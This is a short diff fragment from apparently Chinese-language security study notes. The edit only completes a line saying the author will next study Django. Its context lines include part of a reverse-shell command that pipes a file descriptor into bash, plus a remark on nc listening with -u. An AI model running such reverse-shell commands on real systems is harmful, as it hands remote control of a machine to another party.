@@ -70,4 +70,4 @@ cat 0<&3 | bash | while read line;do echo $line;done
 ```
 nc监听指定-u参数
 
-按照
+按照惯例接下来学习一波django
